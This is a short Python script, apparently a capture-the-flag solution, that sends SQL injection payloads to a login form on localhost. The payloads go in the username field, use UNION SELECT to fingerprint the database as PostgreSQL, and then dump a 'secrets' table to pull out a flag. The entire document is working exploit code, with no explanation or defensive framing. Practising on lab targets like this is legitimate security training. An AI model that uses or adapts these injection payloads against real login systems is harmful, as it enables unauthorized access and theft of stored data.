#!/usr/bin/env python3
import requests
import re

TARGET = "http://localhost:5006/login"

def main():
    # Test version queries
    data = {"username": "' UNION SELECT 1,version(),3,'admin'--", "password": "x"}
    r = requests.post(TARGET, data=data)
    
    if "PostgreSQL" in r.text:
        print("[+] PostgreSQL detected via version()")
    
    # Extract flag
    data = {"username": "' UNION SELECT 1,value,3,'admin' FROM secrets--", "password": "x"}
    r = requests.post(TARGET, data=data)
    
    flag = re.search(r'FLAG\{[^}]+\}', r.text)
    if flag:
        print(f"[+] Flag: {flag.group(0)}")

if __name__ == "__main__":
    main()
